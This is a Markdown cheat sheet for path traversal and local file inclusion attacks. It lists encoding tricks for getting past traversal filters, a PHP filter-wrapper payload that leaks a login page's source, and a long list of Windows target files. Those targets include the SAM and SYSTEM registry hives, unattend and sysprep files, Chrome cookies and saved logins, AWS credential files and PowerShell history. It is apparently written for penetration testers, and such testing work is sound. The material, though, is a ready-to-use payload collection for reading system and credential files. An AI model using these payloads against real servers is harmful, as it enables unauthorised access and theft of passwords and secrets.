### Bypass techniques
- Try / and \ at the start of the folder name to try and reach the root directory.
- Try %2f and %5c (percent encoded versions of the above).
- Try using 16-bit Unicode encoding (. = %u002e, / = %u2215, \ = %u2216).
- Try double URL encoding (. = %252e, / = %252f, \ = %255c).
- Try overlong UTF-8 Unicode encoding (. can be %c0%2e, %e0%40%ae, %c0ae, / can be %c0%af, %e0%80%af, %c0%2f, etc, \ can be %c0%5c, %c0%80%5c).

### PHP include page
```
php://filter/convert.base64-encode/resource=../login.php
```

### Windows interesting files
```
C:/$recycle.bin/s-1-5-18/desktop.ini
C:/apache2/log/access.log
C:/apache2/log/access_log
C:/apache2/log/error.log
C:/apache2/log/error_log
C:/apache2/logs/access.log
C:/apache2/logs/access_log
C:/apache2/logs/error.log
C:/apache2/logs/error_log
C:/apache/log/access.log
C:/apache/log/access_log
C:/apache/log/error.log
C:/apache/log/error_log
C:/apache/logs/access.log
C:/apache/logs/access_log
C:/apache/logs/error.log
C:/apache/logs/error_log
C:/apache/php/php.ini
C:/boot.ini
C:/documents and settings/administrator/desktop/desktop.ini
C:/documents and settings/administrator/ntuser.dat
C:/documents and settings/administrator/ntuser.ini
C:/home2/bin/stable/apache/php.ini
C:/home/bin/stable/apache/php.ini
C:/inetpub/logs/logfiles
C:/inetpub/wwwroot/global.asa
C:/inetpub/wwwroot/index.asp
C:/inetpub/wwwroot/web.config
C:/log/access.log
C:/log/access_log
C:/log/error.log
C:/log/error_log
C:/log/httpd/access_log
C:/log/httpd/error_log
C:/logs/access.log
C:/logs/access_log
C:/logs/error.log
C:/logs/error_log
C:/logs/httpd/access_log
C:/logs/httpd/error_log
C:/MININT/SMSOSD/OSDLOGS/VARIABLES.DAT
C:/mysql/bin/my.ini
C:/mysql/data/hostname.err
C:/mysql/data/mysql.err
C:/mysql/data/mysql.log
C:/mysql/my.cnf
C:/mysql/my.ini
C:/opt/xampp/logs/access.log
C:/opt/xampp/logs/access_log
C:/opt/xampp/logs/error.log
C:/opt/xampp/logs/error_log
C:/php4/php.ini
C:/php4/sessions/
C:/php5/php.ini
C:/php5/sessions/
C:/php/php.ini
C:/php/sessions/
C:/programdata/mcafee/common framework/sitelist.xml
C:/program files/apache group/apache2/conf/httpd.conf
C:/program files/apache group/apache/conf/access.log
C:/program files/apache group/apache/conf/error.log
C:/program files/apache group/apache/conf/httpd.conf
C:/program files/apache group/apache/logs/access.log
C:/program files/apache group/apache/logs/error.log
C:/program files/filezilla server/filezilla server.xml
C:/program files/mysql/data/hostname.err
C:/program files/mysql/data/mysql-bin.log
C:/program files/mysql/data/mysql.err
C:/program files/mysql/data/mysql.log
C:/program files/mysql/my.cnf
C:/program files/mysql/my.ini
C:/program files/mysql/mysql server 5.0/data/hostname.err
C:/program files/mysql/mysql server 5.0/data/mysql-bin.log
C:/program files/mysql/mysql server 5.0/data/mysql.err
C:/program files/mysql/mysql server 5.0/data/mysql.log
C:/program files/mysql/mysql server 5.0/my.cnf
C:/program files/mysql/mysql server 5.0/my.ini
C:/program files/mysql/mysql server 5.1/my.ini
C:/program files (x86)/apache group/apache2/conf/httpd.conf
C:/program files (x86)/apache group/apache/conf/access.log
C:/program files (x86)/apache group/apache/conf/error.log
C:/program files (x86)/apache group/apache/conf/httpd.conf
C:/program files (x86)/apache group/apache/logs/access.log
C:/program files (x86)/apache group/apache/logs/error.log
C:/program files (x86)/filezilla server/filezilla server.xml
C:/program files (x86)/mysql/data/hostname.err
C:/program files (x86)/mysql/data/mysql-bin.log
C:/program files (x86)/mysql/data/mysql.err
C:/program files (x86)/mysql/data/mysql.log
C:/program files (x86)/mysql/my.cnf
C:/program files (x86)/mysql/my.ini
C:/program files (x86)/mysql/mysql server 5.0/data/hostname.err
C:/program files (x86)/mysql/mysql server 5.0/data/mysql-bin.log
C:/program files (x86)/mysql/mysql server 5.0/data/mysql.err
C:/program files (x86)/mysql/mysql server 5.0/data/mysql.log
C:/program files (x86)/mysql/mysql server 5.0/my.cnf
C:/program files (x86)/mysql/mysql server 5.0/my.ini
C:/program files (x86)/mysql/mysql server 5.1/my.ini
C:/program files (x86)/xampp/apache/conf/httpd.conf
C:/program files/xampp/apache/conf/httpd.conf
C:/sysprep.inf
C:/sysprep/sysprep.inf
C:/sysprep/sysprep.xml
C:/sysprep.xml
C:/system32/inetsrv/metabase.xml
C:/system volume information/wpsettings.dat
C:/unattended.txt
C:/unattended.xml
C:/unattend.txt
C:/unattend.xml
C:/users/administrator/appdata/local/google/chrome/user data/default/bookmarks
C:/users/administrator/appdata/local/google/chrome/user data/default/bookmarks.bak
C:/users/administrator/appdata/local/google/chrome/user data/default/cookies
C:/users/administrator/appdata/local/google/chrome/user data/default/history
C:/users/administrator/appdata/local/google/chrome/user data/default/last session
C:/users/administrator/appdata/local/google/chrome/user data/default/login data
C:/users/administrator/appdata/local/google/chrome/user data/default/preferences
C:/users/administrator/appdata/local/google/chrome/user data/default/secure preferences
C:/users/administrator/appdata/local/google/chrome/user data/default/top sites
C:/users/administrator/appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
C:/users/administrator/.aws/config
C:/users/administrator/.aws/credentials
C:/users/administrator/desktop/desktop.ini
C:/users/administrator/desktop/proof.txt
C:/users/administrator/.elasticbeanstalk/config 
C:/users/administrator/ntuser.dat
C:/users/administrator/ntuser.ini
C:/windows/csc/v2.0.6/pq
C:/windows/csc/v2.0.6/sm
C:/windows/debug/netsetup.log
C:/windows/explorer.exe
C:/windows/iis5.log
C:/windows/iis6.log
C:/windows/iis7.log
C:/windows/iis8.log
C:/windows/notepad.exe
C:/windows/panther/setupinfo
C:/windows/panther/setupinfo.bak
C:/windows/panther/sysprep.inf
C:/windows/panther/sysprep.xml
C:/windows/panther/unattended.txt
C:/windows/panther/unattended.xml
C:/windows/panther/unattend/setupinfo
C:/windows/panther/unattend/setupinfo.bak
C:/windows/panther/unattend/sysprep.inf
C:/windows/panther/unattend/sysprep.xml
C:/windows/panther/unattend.txt
C:/windows/panther/unattend/unattended.txt
C:/windows/panther/unattend/unattended.xml
C:/windows/panther/unattend/unattend.txt
C:/windows/panther/unattend/unattend.xml
C:/windows/panther/unattend.xml
C:/windows/php.ini
C:/windows/repair/sam
C:/windows/repair/security
C:/windows/repair/software
C:/windows/repair/system
C:/windows/system32/config/appevent.evt
C:/windows/system32/config/default.sav
C:/windows/system32/config/regback/default
C:/windows/system32/config/regback/sam
C:/windows/system32/config/regback/security
C:/windows/system32/config/regback/software
C:/windows/system32/config/regback/system
C:/windows/system32/config/sam
C:/windows/system32/config/secevent.evt
C:/windows/system32/config/security.sav
C:/windows/system32/config/software.sav
C:/windows/system32/config/system
C:/windows/system32/config/system.sa
C:/windows/system32/config/system.sav
C:/windows/system32/drivers/etc/hosts
C:/windows/system32/eula.txt
C:/windows/system32/inetsrv/config/applicationhost.config
C:/windows/system32/inetsrv/config/schema/aspnet_schema.xml
C:/windows/system32/license.rtf
C:/windows/system32/logfiles/httperr/httperr1.log
C:/windows/system32/sysprep.inf
C:/windows/system32/sysprepsysprep.inf
C:/windows/system32/sysprep/sysprep.xml
C:/windows/system32/sysprepsysprep.xml
C:/windows/system32/sysprepunattended.txt
C:/windows/system32/sysprepunattended.xml
C:/windows/system32/sysprepunattend.txt
C:/windows/system32/sysprepunattend.xml
C:/windows/system32/sysprep.xml
C:/windows/system32/unattended.txt
C:/windows/system32/unattended.xml
C:/windows/system32/unattend.txt
C:/windows/system32/unattend.xml
C:/windows/system.ini
C:/windows/temp/
C:/windows/windowsupdate.log
C:/windows/win.ini
C:/winnt/php.ini
C:/winnt/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/conf/httpd.conf
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/filezillaftp/filezilla server.xml
C:/xampp/filezillaftp/logs
C:/xampp/filezillaftp/logs/access.log
C:/xampp/filezillaftp/logs/error.log
C:/xampp/mercurymail/logs/access.log
C:/xampp/mercurymail/logs/error.log
C:/xampp/mercurymail/mercury.ini
C:/xampp/mysql/data/mysql.err
C:/xampp/phpmyadmin/config.inc
C:/xampp/phpmyadmin/config.inc.php
C:/xampp/phpmyadmin/phpinfo.php
C:/xampp/php/php.ini
C:/xampp/sendmail/sendmail.ini
C:/xampp/sendmail/sendmail.log
C:/xampp/tomcat/conf/tomcat-users.xml
C:/xampp/tomcat/conf/web.xml
C:/xampp/webalizer/webalizer.conf
C:/xampp/webdav/webdav.txt

```
https://raw.githubusercontent.com/soffensive/windowsblindread/master/windows-files.txt

### Linux interesting files
https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/
